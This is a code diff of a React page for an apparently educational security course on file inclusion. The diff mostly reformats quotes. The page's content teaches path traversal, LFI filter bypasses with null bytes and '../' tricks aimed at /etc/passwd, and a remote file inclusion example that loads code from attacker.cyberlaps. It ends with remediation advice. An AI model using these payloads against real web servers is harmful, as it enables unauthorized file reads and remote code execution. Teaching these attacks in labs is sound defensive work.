@@ -1,50 +1,48 @@
-import React from "react";
-import Header from "../../Header/Header";
-import background from "../../assets/img/File Inclusion/baner_lap.png";
-import courseImage from "../../assets/img/File Inclusion/course_image.png";
-import Footer from "../../Footer/Footer";
-import "../../Components/Topics CSS/topics.css";
-import exampleImage1 from "../../assets/img/File Inclusion/image_1.webp";
-import exampleImage2 from "../../assets/img/File Inclusion/image_2.webp";
-import exampleImage3 from "../../assets/img/File Inclusion/image_3.webp";
-import exampleImage4 from "../../assets/img/File Inclusion/image_4.webp";
-import exampleImage5 from "../../assets/img/File Inclusion/image_5.webp";
-import exampleImage6 from "../../assets/img/File Inclusion/image_6.webp";
-import exampleImage7 from "../../assets/img/File Inclusion/image_7.webp";
-import UseFaqSection from "../../Components/UseFaqSection/UseFaqSection.jsx";
-import CourseLanding from "../../Components/CourseLanding/CourseLanding.jsx";
-import ThemeSwitcher from "../../Components/ThemeSwitcher/ThemeSwitcher.jsx";
+import React from 'react';
+import Header from '../../Header/Header';
+import background from '../../assets/img/File Inclusion/baner_lap.png';
+import courseImage from '../../assets/img/File Inclusion/course_image.png';
+import Footer from '../../Footer/Footer';
+import '../../Components/Topics CSS/topics.css';
+import exampleImage1 from '../../assets/img/File Inclusion/image_1.webp';
+import exampleImage2 from '../../assets/img/File Inclusion/image_2.webp';
+import exampleImage3 from '../../assets/img/File Inclusion/image_3.webp';
+import exampleImage4 from '../../assets/img/File Inclusion/image_4.webp';
+import exampleImage5 from '../../assets/img/File Inclusion/image_5.webp';
+import exampleImage6 from '../../assets/img/File Inclusion/image_6.webp';
+import exampleImage7 from '../../assets/img/File Inclusion/image_7.webp';
+import UseFaqSection from '../../Components/UseFaqSection/UseFaqSection.jsx';
+import CourseLanding from '../../Components/CourseLanding/CourseLanding.jsx';
 export default function FileInclusion() {
   const { faqSectionRef, handleGoToLab } = UseFaqSection();
   return (
     <>
       <Header />
-      <ThemeSwitcher/>
       {/* Start Landing  */}
       <CourseLanding
         background={background}
         courseImage={courseImage}
-        courseTitle="File Inclusion"
-        courseDescription=" A vulnerability that allows an attacker to attach a remotely or locally hosted file, usually via a script on the web server."
-        difficulty="Intermediate"
-        duration="30 min"
-        onSaveRoom={() => console.log("Room Saved!")}
-        onLike={() => console.log("Liked!")}
-        onDislike={() => console.log("Disliked!")}
+        courseTitle='File Inclusion'
+        courseDescription=' A vulnerability that allows an attacker to attach a remotely or locally hosted file, usually via a script on the web server.'
+        difficulty='Intermediate'
+        duration='30 min'
+        onSaveRoom={() => console.log('Room Saved!')}
+        onLike={() => console.log('Liked!')}
+        onDislike={() => console.log('Disliked!')}
       />
       {/* End Landing  */}
       {/* Start Course Content  */}
-      <div className="Content">
-        <div className="secure-container" ref={faqSectionRef}>
-          <div className="content-row">
-            <div className="content-section">
-              <dl className="topics-text">
+      <div className='Content'>
+        <div className='secure-container' ref={faqSectionRef}>
+          <div className='content-row'>
+            <div className='content-section'>
+              <dl className='topics-text'>
                 {/* Single FAQ Area  */}
-                <dt className="fadeInUp faq-header">
+                <dt className='fadeInUp faq-header'>
                   <span>Topic 1</span> Introduction
                 </dt>
-                <dd className="fadeInUp faq-body" id="border-left">
-                  <h1 className="content__title">Welcome to File Inclusion</h1>
+                <dd className='fadeInUp faq-body' id='border-left'>
+                  <h1 className='content__title'>Welcome to File Inclusion</h1>
                   <p>
                     This room aims to equip you with the essential knowledge to
                     exploit file inclusion vulnerabilities, including Local File
@@ -62,15 +60,15 @@ export default function FileInclusion() {
                     retrieve data or perform actions based on user input. The
                     following diagram breaks down the essential parts of a URL.
                   </p>
-                  <div className="Content__img--box">
-                    <div className="Content__img__box__over--hidden">
-                      <img src={exampleImage1} alt="Example" />
+                  <div className='Content__img--box'>
+                    <div className='Content__img__box__over--hidden'>
+                      <img src={exampleImage1} alt='Example' />
                     </div>
                   </div>
                   <p>
                     For example, parameters are used with Google searching,
                     where GET requests pass user input into the search engine.
-                    If you are not familiar with the topic, you can view the How{" "}
+                    If you are not familiar with the topic, you can view the How{' '}
                     <span>The Web Works</span>
                     module to understand the concept.
                   </p>
@@ -80,18 +78,18 @@ export default function FileInclusion() {
                     request to the webserver that includes a file to display.
                     For example, if a user wants to access and display their CV
                     within the web application, the request may look as follows,
-                    <a href="http://webapp.cyberlaps/get.php?file=userCV.pdf">
+                    <a href='http://webapp.cyberlaps/get.php?file=userCV.pdf'>
                       Click Here
                     </a>
                     , where the file is the parameter and the userCV.pdf, is the
                     required file to access.
                   </p>
-                  <div className="Content__img--box">
-                    <div className="Content__img__box__over--hidden">
-                      <img src={exampleImage2} alt="Example" />
+                  <div className='Content__img--box'>
+                    <div className='Content__img__box__over--hidden'>
+                      <img src={exampleImage2} alt='Example' />
                     </div>
                   </div>
-                  <h2 className="content__title">
+                  <h2 className='content__title'>
                     Why do File inclusion vulnerabilities happen?
                   </h2>
                   <p>
@@ -104,7 +102,7 @@ export default function FileInclusion() {
                     not validated, the user can pass any input to the function,
                     causing the vulnerability.
                   </p>
-                  <h2 className="content__title">
+                  <h2 className='content__title'>
                     What is the risk of File inclusion?
                   </h2>
                   <p>
@@ -116,10 +114,10 @@ export default function FileInclusion() {
                     used in tandem to gain remote command execution (RCE).
                   </p>
                 </dd>
-                <dt className="fadeInUp faq-header">
+                <dt className='fadeInUp faq-header'>
                   <span>Topic 2</span> Path Traversal
                 </dt>
-                <dd className="fadeInUp faq-body" id="border-left">
+                <dd className='fadeInUp faq-body' id='border-left'>
                   <p>
                     Also known as Directory traversal, a web security
                     vulnerability allows an attacker to read operating system
@@ -137,8 +135,8 @@ export default function FileInclusion() {
                     validation or filtering is the cause of the vulnerability.
                     In PHP, you can use the file_get_contents to read the
                     content of a file. You can find more information about the
-                    function{" "}
-                    <a href="https://www.php.net/manual/en/function.file-get-contents.php">
+                    function{' '}
+                    <a href='https://www.php.net/manual/en/function.file-get-contents.php'>
                       Here
                     </a>
                     .
@@ -149,9 +147,9 @@ export default function FileInclusion() {
                     the contents of userCV.pdf from a defined path
                     /var/www/app/CVs.
                   </p>
-                  <div className="Content__img--box">
-                    <div className="Content__img__box__over--hidden">
-                      <img src={exampleImage3} alt="Example" />
+                  <div className='Content__img--box'>
+                    <div className='Content__img__box__over--hidden'>
+                      <img src={exampleImage3} alt='Example' />
                     </div>
                   </div>
                   <p>
@@ -173,18 +171,18 @@ export default function FileInclusion() {
                     changes the directory to /etc, and from there, it read the
                     passwd file.
                   </p>
-                  <div className="Content__img--box">
-                    <div className="Content__img__box__over--hidden">
-                      <img src={exampleImage4} alt="Example" />
+                  <div className='Content__img--box'>
+                    <div className='Content__img__box__over--hidden'>
+                      <img src={exampleImage4} alt='Example' />
                     </div>
                   </div>
                   <p>
                     As a result, the web application sends back the file’s
                     content to the user.
                   </p>
-                  <div className="Content__img--box">
-                    <div className="Content__img__box__over--hidden">
-                      <img src={exampleImage5} alt="Example" />
+                  <div className='Content__img--box'>
+                    <div className='Content__img__box__over--hidden'>
+                      <img src={exampleImage5} alt='Example' />
                     </div>
                   </div>
                   <p>
@@ -212,10 +210,10 @@ export default function FileInclusion() {
                   </p>
                 </dd>
 
-                <dt className="fadeInUp faq-header">
+                <dt className='fadeInUp faq-header'>
                   <span>Topic 3</span>Local File Inclusion (LFI) #1
                 </dt>
-                <dd className="fadeInUp faq-body" id="border-left">
+                <dd className='fadeInUp faq-body' id='border-left'>
                   <p>
                     LFI attacks against web applications are often due to a
                     developers’ lack of security awareness. With PHP, using
@@ -232,17 +230,16 @@ export default function FileInclusion() {
                   </p>
                   <ol>
                     <li>
-                      <div className="terminal-container">
-                        <div className="terminal-content">
-                          <div className="terminal-top">
+                      <div className='terminal-container'>
+                        <div className='terminal-content'>
+                          <div className='terminal-top'>
                             Suppose the web application provides two languages,
                             and the user can select between the EN and AR
                           </div>
                           <pre
-                            className="terminal-codelanguage-bash"
-                            tabIndex="0"
-                          >
-                            <code className="language-bash">
+                            className='terminal-codelanguage-bash'
+                            tabIndex='0'>
+                            <code className='language-bash'>
                               <>&lt;</>?PHP
                               <br />
                               include($_GET["lang"]);
@@ -256,13 +253,13 @@ export default function FileInclusion() {
                         parameter lang to include the file of the page. The call
                         can be done by sending the following HTTP request as
                         follows:
-                        <a href="http://webapp.cyberlaps/index.php?lang=EN.php">
+                        <a href='http://webapp.cyberlaps/index.php?lang=EN.php'>
                           http://webapp.cyberlaps/index.php?lang=EN.php
-                        </a>{" "}
+                        </a>{' '}
                         to load the English page or
-                        <a href="http://webapp.cyberlaps/index.php?lang=AR.php">
+                        <a href='http://webapp.cyberlaps/index.php?lang=AR.php'>
                           http://webapp.cyberlaps/index.php?lang=AR.php
-                        </a>{" "}
+                        </a>{' '}
                         to load the Arabic page, where EN.php and AR.php files
                         exist in the same directory.
                       </p>
@@ -273,7 +270,7 @@ export default function FileInclusion() {
                         /etc/passwd file, which contains sensitive information
                         about the users of the Linux operating system, we can
                         try the following:
-                        <a href="http://webapp.cyberlaps/get.php?file=/etc/passwd">
+                        <a href='http://webapp.cyberlaps/get.php?file=/etc/passwd'>
                           http://webapp.cyberlaps/get.php?file=/etc/passwd
                         </a>
                       </p>
@@ -286,17 +283,16 @@ export default function FileInclusion() {
                       file.
                     </li>
                     <li>
-                      <div className="terminal-container">
-                        <div className="terminal-content">
-                          <div className="terminal-top">
+                      <div className='terminal-container'>
+                        <div className='terminal-content'>
+                          <div className='terminal-top'>
                             Next, In the following code, the developer decided
                             to specify the directory inside the function.
                           </div>
                           <pre
-                            className="terminal-codelanguage-bash"
-                            tabIndex="0"
-                          >
-                            <code className="language-bash">
+                            className='terminal-codelanguage-bash'
+                            tabIndex='0'>
+                            <code className='language-bash'>
                               <>&lt;</>?PHP
                               <br /> include("languages/". $_GET['lang']);
                               <br /> ?<>&gt;</>
@@ -321,17 +317,17 @@ export default function FileInclusion() {
                         exploit:
                       </p>
                       <p>
-                        <a href="http://webapp.cyberlaps/index.php?lang=../../../../etc/passwd">
+                        <a href='http://webapp.cyberlaps/index.php?lang=../../../../etc/passwd'>
                           http://webapp.cyberlaps/index.php?lang=../../../../etc/passwd
                         </a>
                       </p>
                     </li>
                   </ol>
                 </dd>
-                <dt className="fadeInUp faq-header">
+                <dt className='fadeInUp faq-header'>
                   <span>Topic 4</span>Local File Inclusion (LFI) #2
                 </dt>
-                <dd className="fadeInUp faq-body" id="border-left">
+                <dd className='fadeInUp faq-body' id='border-left'>
                   <p>
                     In this Topicc, we go a little bit deeper into LFI. We
                     discussed a couple of techniques to bypass the filter within
@@ -348,21 +344,20 @@ export default function FileInclusion() {
                         processed into the web app.
                       </p>
                       <p>
-                        In this scenario, we have the following entry point:{" "}
-                        <a href="http://webapp.cyberlaps/index.php?lang=EN">
+                        In this scenario, we have the following entry point:{' '}
+                        <a href='http://webapp.cyberlaps/index.php?lang=EN'>
                           http://webapp.cyberlaps/index.php?lang=EN
                         </a>
                         . If we enter an invalid input, such as cyberlaps, we
                         get the following error
                       </p>
-                      <div className="terminal-container">
-                        <div className="terminal-content">
-                          <div class="terminal-top"></div>
+                      <div className='terminal-container'>
+                        <div className='terminal-content'>
+                          <div class='terminal-top'></div>
                           <pre
-                            className="terminal-codelanguage-bash"
-                            tabIndex="0"
-                          >
-                            <code className="language-bash">
+                            className='terminal-codelanguage-bash'
+                            tabIndex='0'>
+                            <code className='language-bash'>
                               Warning: include(languages/cyberlaps.php): failed
                               to open stream: No such file or directory in
                               /var/www/html/cyberlaps-4/index.php on line 12
@@ -395,23 +390,22 @@ export default function FileInclusion() {
                         the current folder. Let’s try the following:
                       </p>
                       <p>
-                        <a href="http://webapp.cyberlaps/index.php?lang=../../../../etc/passwd">
+                        <a href='http://webapp.cyberlaps/index.php?lang=../../../../etc/passwd'>
                           http://webapp.cyberlaps/index.php?lang=../../../../etc/passwd
                         </a>
                       </p>
-                      <p className="note__new--note">
+                      <p className='note__new--note'>
                         note__new--note that we used 4 ../ because we know the
                         path has four levels /var/www/html/cyberlaps-4. But we
                         still receive the following error:
                       </p>
-                      <div className="terminal-container">
-                        <div className="terminal-content">
-                          <div className="terminal-top"></div>
+                      <div className='terminal-container'>
+                        <div className='terminal-content'>
+                          <div className='terminal-top'></div>
                           <pre
-                            className="terminal-codelanguage-bash"
-                            tabIndex="0"
-                          >
-                            <code className="language-bash">
+                            className='terminal-codelanguage-bash'
+                            tabIndex='0'>
+                            <code className='language-bash'>
                               Warning:
                               include(languages/../../../../../etc/passwd.php):
                               failed to open stream: No such file or directory
@@ -444,7 +438,7 @@ export default function FileInclusion() {
                         which equivalent to →
                         include(“languages/../../../../../etc/passwd”);
                       </p>
-                      <p className="note__new--note">
+                      <p className='note__new--note'>
                         note__new--note: the %00 trick is fixed and not working
                         with PHP 5.3.4 and above.
                       </p>
@@ -458,11 +452,11 @@ export default function FileInclusion() {
                         the NullByte %00 or the current directory trick at the
                         end of the filtered keyword /.. The exploit will be
                         similar to
-                        <a href="http://webapp.cyberlaps/index.php?lang=/etc/passwd/">
+                        <a href='http://webapp.cyberlaps/index.php?lang=/etc/passwd/'>
                           http://webapp.cyberlaps/index.php?lang=/etc/passwd/
                         </a>
                         . We could also use
-                        <a href="http://webapp.cyberlaps/index.php?lang=/etc/passwd%00">
+                        <a href='http://webapp.cyberlaps/index.php?lang=/etc/passwd%00'>
                           http://webapp.cyberlaps/index.php?lang=/etc/passwd%00
                         </a>
                         .
@@ -485,19 +479,18 @@ export default function FileInclusion() {
                         Let’s test out and check the error message!
                       </p>
                       <p>
-                        <a href="http://webapp.cyberlaps/index.php?lang=../../../../etc/passwd">
+                        <a href='http://webapp.cyberlaps/index.php?lang=../../../../etc/passwd'>
                           http://webapp.cyberlaps/index.php?lang=../../../../etc/passwd
                         </a>
                       </p>
                       <p>We got the following error!</p>
-                      <div className="terminal-container">
-                        <div className="terminal-content">
-                          <div className="terminal-top"></div>
+                      <div className='terminal-container'>
+                        <div className='terminal-content'>
+                          <div className='terminal-top'></div>
                           <pre
-                            className="terminal-codelanguage-bash"
-                            tabIndex="0"
-                          >
-                            <code className="language-bash">
+                            className='terminal-codelanguage-bash'
+                            tabIndex='0'>
+                            <code className='language-bash'>
                               Warning: include(languages/etc/passwd): failed to
                               open stream: No such file or directory in
                               /var/www/html/cyberlaps-5/index.php on line 15
@@ -525,9 +518,9 @@ export default function FileInclusion() {
                         replaces the first subset string ../ it finds and
                         doesn’t do another pass, leaving what is pictured below.
                       </p>
-                      <div className="Content__img--box">
-                        <div className="Content__img__box__over--hidden">
-                          <img src={exampleImage6} alt="Example" />
+                      <div className='Content__img--box'>
+                        <div className='Content__img__box__over--hidden'>
+                          <img src={exampleImage6} alt='Example' />
                         </div>
                       </div>
                     </li>
@@ -537,9 +530,9 @@ export default function FileInclusion() {
                         forces the include to read from a defined directory! For
                         example, if the web application asks to supply input
                         that has to include a directory such as:
-                        <a href="http://webapp.cyberlaps/index.php?lang=languages/EN.php">
+                        <a href='http://webapp.cyberlaps/index.php?lang=languages/EN.php'>
                           http://webapp.cyberlaps/index.php?lang=languages/EN.php
-                        </a>{" "}
+                        </a>{' '}
                         then, to exploit this, we need to include the directory
                         in the payload like so:
                         ?lang=languages/../../../../../etc/passwd.
@@ -547,10 +540,10 @@ export default function FileInclusion() {
                     </li>
                   </ol>
                 </dd>
-                <dt className="fadeInUp faq-header">
+                <dt className='fadeInUp faq-header'>
                   <span>Topic 5</span>Remote File Inclusion (RFI)
                 </dt>
-                <dd className="fadeInUp faq-body" id="border-left">
+                <dd className='fadeInUp faq-body' id='border-left'>
                   <p>
                     The risk of RFI is higher than LFI since RFI vulnerabilities
                     allow an attacker to gain Remote Command Execution (RCE) on
@@ -570,24 +563,24 @@ export default function FileInclusion() {
                     the content of the malicious file executes on the vulnerable
                     application server.
                   </p>
-                  <div className="Content__img--box">
-                    <div className="Content__img__box__over--hidden">
-                      <img src={exampleImage7} alt="Example" />
+                  <div className='Content__img--box'>
+                    <div className='Content__img__box__over--hidden'>
+                      <img src={exampleImage7} alt='Example' />
                     </div>
                   </div>
                   <p>RFI steps</p>
                   <p>
                     The following figure is an example of steps for a successful
                     RFI attack! Let’s say that the attacker hosts a PHP file on
-                    their own server{" "}
+                    their own server{' '}
                     <span>http://attacker.cyberlaps/cmd.txt</span> where cmd.txt
                     contains a printing message Hello cyberlaps.
                   </p>
-                  <div className="terminal-container">
-                    <div className="terminal-content">
-                      <div class="terminal-top"></div>
-                      <pre className="terminal-codelanguage-bash" tabIndex="0">
-                        <code className="language-bash">
+                  <div className='terminal-container'>
+                    <div className='terminal-content'>
+                      <div class='terminal-top'></div>
+                      <pre className='terminal-codelanguage-bash' tabIndex='0'>
+                        <code className='language-bash'>
                           <>&lt;</>?PHP echo "Hello cyberlaps"; ?<>&gt;</>
                         </code>
                       </pre>
@@ -595,10 +588,10 @@ export default function FileInclusion() {
                   </div>
                   <p>
                     First, the attacker injects the malicious URL, which points
-                    to the attacker’s server, such as{" "}
-                    <a href="http://webapp.cyberlaps/index.php?lang=http://attacker.cyberlaps/cmd.txt">
+                    to the attacker’s server, such as{' '}
+                    <a href='http://webapp.cyberlaps/index.php?lang=http://attacker.cyberlaps/cmd.txt'>
                       http://webapp.cyberlaps/index.php?lang=http://attacker.cyberlaps/cmd.txt
-                    </a>{" "}
+                    </a>{' '}
                     . If there is no input validation, then the malicious URL
                     passes into the include function. Next, the web app server
                     will send a GET request to the malicious server to fetch the
@@ -609,17 +602,17 @@ export default function FileInclusion() {
                     message.
                   </p>
                   <p>
-                    Visit the following lab URL:{" "}
-                    <a href="http://MACHINE_IP/playground.php">
+                    Visit the following lab URL:{' '}
+                    <a href='http://MACHINE_IP/playground.php'>
                       http://MACHINE_IP/playground.php
-                    </a>{" "}
+                    </a>{' '}
                     to try out an RFI attack.
                   </p>
                 </dd>
-                <dt className="fadeInUp faq-header">
+                <dt className='fadeInUp faq-header'>
                   <span>Topic 6</span>Remediation
                 </dt>
-                <dd className="fadeInUp faq-body" id="border-left">
+                <dd className='fadeInUp faq-body' id='border-left'>
                   <p>
                     As a developer, it’s important to be aware of web
                     application vulnerabilities, how to find them, and
@@ -660,13 +653,12 @@ export default function FileInclusion() {
                 </dd>
               </dl>
             </div>
-            <div className="go-to-section">
+            <div className='go-to-section'>
               <button
                 onClick={() =>
-                  handleGoToLab("/fileinclusion/fileinclusion_lab")
+                  handleGoToLab('/fileinclusion/fileinclusion_lab')
                 }
-                className="go-to"
-              >
+                className='go-to'>
                 Go To Labs
               </button>
             </div>
